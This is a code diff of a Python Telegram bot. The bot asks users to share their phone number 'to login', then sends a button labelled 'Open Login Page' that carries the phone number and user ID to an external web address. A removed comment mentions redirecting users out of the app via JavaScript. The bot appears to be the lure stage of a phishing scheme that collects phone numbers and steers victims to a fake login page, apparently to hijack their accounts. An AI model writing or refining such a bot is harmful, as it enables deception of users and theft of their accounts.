@@ -4,52 +4,39 @@ import urllib.parse
 from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
-# Railway Environment Variables
 WEB_URL = os.getenv("WEB_URL")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 
-# DEBUG LOGS
-print(f"[DEBUG] WEB_URL = {WEB_URL}")
-print(f"[DEBUG] BOT_TOKEN = {BOT_TOKEN}")
+print(f"[BOT] WEB_URL = {WEB_URL}")
+print(f"[BOT] TOKEN = {BOT_TOKEN[:10]}...")
 
-# VALIDATION
-if not BOT_TOKEN or len(BOT_TOKEN) < 30:
-    print("FATAL: BOT_TOKEN is missing or invalid!")
-    exit(1)
-if not WEB_URL:
-    print("FATAL: WEB_URL is missing!")
+if not BOT_TOKEN or not WEB_URL:
+    print("FATAL: Missing BOT_TOKEN or WEB_URL")
     exit(1)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [[KeyboardButton("Share My Phone Number", request_contact=True)]]
+    keyboard = [[KeyboardButton("Share Phone Number", request_contact=True)]]
     reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
-    await update.message.reply_text("Please share your phone number to continue.", reply_markup=reply_markup)
+    await update.message.reply_text("Please share your phone number to login.", reply_markup=reply_markup)
 
 async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     contact = update.message.contact
     if not contact:
-        await update.message.reply_text("Please share a valid contact.")
+        await update.message.reply_text("Invalid contact.")
         return
 
     phone = contact.phone_number
     user_id = update.effective_user.id
-    params = urllib.parse.urlencode({'user_id': user_id, 'phone': phone})
-    final_url = f"{WEB_URL}?{params}"
+    url = f"{WEB_URL}?phone={urllib.parse.quote(phone)}&user_id={user_id}"
 
-    # Button opens in-app — but we'll redirect externally via JS
-    keyboard = [[InlineKeyboardButton("Open Secure Login", url=final_url)]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-
-    await update.message.reply_text(
-        "Secure login ready.\nTap below to continue:",
-        reply_markup=reply_markup
-    )
+    button = InlineKeyboardMarkup([[InlineKeyboardButton("Open Login Page", url=url)]])
+    await update.message.reply_text("Tap below to continue login:", reply_markup=button)
 
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
-    print("Bot is running...")
+    print("Bot running...")
     app.run_polling()
 
 if __name__ == "__main__":
